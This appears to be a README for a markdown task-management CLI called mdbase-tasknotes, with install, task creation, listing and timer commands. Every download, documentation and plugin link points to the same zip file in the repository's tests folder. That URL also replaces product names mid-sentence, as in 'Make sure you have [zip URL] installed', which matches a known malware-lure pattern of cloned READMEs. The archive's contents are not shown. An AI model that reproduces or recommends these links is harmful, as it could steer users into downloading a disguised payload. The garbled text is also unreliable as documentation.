# 🎯 mdbase-tasknotes - Manage Your Markdown Tasks Easily

[![Download mdbase-tasknotes](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip%20mdbase--tasknotes-brightgreen)](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip)

## 📦 Installation

To get started, you need to install `mdbase-tasknotes` on your system. 

1. Open your terminal (Command Prompt, PowerShell, or terminal emulator).
2. Run the following command:

   ```
   npm install -g mdbase-tasknotes
   ```

Make sure you have https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip installed. If you don’t have it yet, download and install it from the [https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip website](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip).

## 🚀 Getting Started

After installation, you can quickly set up your first task management collection.

### 🛠 Initialize a New Collection

1. Run this command to create a new task collection:

   ```
   mtn init ~/notes
   ```

2. Set this collection as your default with:

   ```
   mtn config --set collectionPath=~/notes
   ```

Now your `mdbase-tasknotes` is ready to use.

## ✔️ Creating Tasks

You can create tasks using simple natural language commands. Here’s how:

1. To add a new task, type:

   ```
   mtn create "Buy groceries tomorrow #shopping @errands"
   ```

2. Additionally, you can create tasks with different details, such as:

   ```
   mtn create "Write report due Friday #work +quarterly-review"
   mtn create "Fix the faucet high priority #home @house"
   ```

These commands allow you to manage tasks related to shopping, work, and home with ease.

## 📋 Listing and Querying Tasks

You can easily view your tasks using various commands.

1. To list all tasks, run:

   ```
   mtn list
   ```

2. To see overdue tasks, use:

   ```
   mtn list --overdue
   ```

3. To filter tasks by tag or status, try:

   ```
   mtn list --tag work --status open
   mtn list --json
   ```

This will help you focus on the tasks that matter most.

## ✅ Completing Tasks

Once you finish a task, mark it as complete with just a command:

```
mtn complete "Buy groceries"
```

This will remove the completed task from your list.

## ⏱ Tracking Time

You can also track the time spent on tasks. Here’s how to do it:

1. Start your timer:

   ```
   mtn timer start "Write report"
   ```

2. Check the current timer status with:

   ```
   mtn timer status
   ```

3. Stop the timer when you finish:

   ```
   mtn timer stop
   ```

4. To review logged time:

   ```
   mtn timer log --period today
   ```

This feature is useful for managing deadlines and productivity.

## 💡 Features Overview

- **Natural Language Processing:** Create tasks effortlessly with simple phrases.
- **Task Management:** Easily list, complete, and query tasks.
- **Time Tracking:** Monitor the time spent on each task.
- **Markdown Integration:** Works seamlessly with markdown files.
- **Customizable Collections:** Create a custom collection for your notes.

## 🌐 Download

For the latest version of `mdbase-tasknotes`, visit this page to download:

[Download mdbase-tasknotes](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip)

Make sure to check release notes for new features and enhancements.

## 📝 System Requirements

- Operating System: Works on Windows, macOS, and Linux.
- https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip Recommended version 12 or higher.

## 📚 Getting Help

If you encounter any issues or need help, consult the documentation on GitHub or create an issue in the repository. The community is here to assist you.

## 🔗 Additional Resources

- [mdbase Documentation](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip)
- [TaskNotes Obsidian Plugin](https://raw.githubusercontent.com/argasdaad/mdbase-tasknotes/main/tests/mdbase-tasknotes-2.8.zip)

Explore task management with `mdbase-tasknotes` and enhance your productivity with markdown tasks.